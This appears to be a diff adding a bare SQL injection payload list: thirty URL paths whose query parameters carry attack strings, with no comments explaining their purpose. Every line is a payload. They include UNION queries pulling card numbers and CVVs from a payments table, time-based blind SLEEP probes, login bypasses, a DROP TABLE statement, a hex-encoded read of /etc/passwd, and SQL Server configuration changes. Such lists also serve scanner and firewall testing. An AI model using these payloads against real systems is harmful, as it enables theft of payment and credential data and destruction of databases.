@@ -1,0 +1,30 @@
+/shop/view?pid=7' UNION SELECT card_no,cvv FROM payments--
+/shop/view?pid=7 UNION ALL SELECT NULL,@@hostname,NULL
+/news?id=5 AND 1=(SELECT COUNT(*) FROM admin)
+/news?id=5';SELECT SLEEP(4)--
+/news?id=5 OR SLEEP(4)=0
+/profile?u=bob' OR 'x'='x
+/profile?u=bob") OR ("1"="1
+/profile?u=bob' OR 1=1 LIMIT 1 OFFSET 1--
+/login?user=admin'/*&pass=x*/--
+/login?user=admin' #
+/list?sort=name;DROP TABLE orders
+/list?sort=name,(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
+/list?sort=(SELECT 1 FROM (SELECT SLEEP(2))x)
+/cat?id=3 AND (SELECT 5 FROM dual)=5
+/cat?id=3 AND ORD(MID((SELECT user()),1,1))>50
+/cat?id=3 AND substring(version(),1,1)=5
+/cat?id=3 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()
+/cat?id=3%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20-
+/cat?id=3%27%20AND%20SLEEP(5)--%20
+/cat?id=3'%20OR%20'1'%3D'1
+/cat?id=3 AND 1=1 UNION SELECT 1,2,3
+/cat?id=-1 UNION SELECT 1,load_file(0x2f6574632f706173737764),3
+/cat?id=1 EXEC sp_configure 'show advanced options',1
+/cat?id=1; EXEC sp_executesql N'select 1'
+/cat?id=1' AND ExtractValue(1,concat(0x5c,(select user())))--
+/cat?id=1 OR 1 IN (SELECT @@version)
+/cat?id=1 AND (SELECT 1 FROM generate_series(1,5000000))
+/cat?id=1' ORDER BY 5--+
+/cat?id=1 UNION SELECT NULL FROM dual
+/api/users?filter=name eq 'a' or 1 eq 1
